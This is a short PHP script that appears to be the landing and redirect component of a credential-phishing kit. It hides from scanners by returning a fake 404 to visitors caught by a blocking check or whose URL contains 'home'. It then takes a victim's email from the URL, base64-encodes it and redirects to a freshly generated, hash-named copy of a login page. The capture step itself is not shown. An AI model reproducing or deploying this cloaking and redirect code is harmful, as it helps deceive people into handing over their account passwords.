<?php

include_once("api.php");

if (strstr(strtolower($_SERVER['REQUEST_URI']), 'home') || isToBlock()) {
    header("HTTP/1.0 404 Not Found");
    die();
}

session_start();

$email = $_GET['email'];
$_SESSION['email'] = $email;
$id = base64_encode($email);
$secfile = createHashedPage("login.php");

if ($secfile) {
    header("Location: $secfile?id=$id");
}

?>
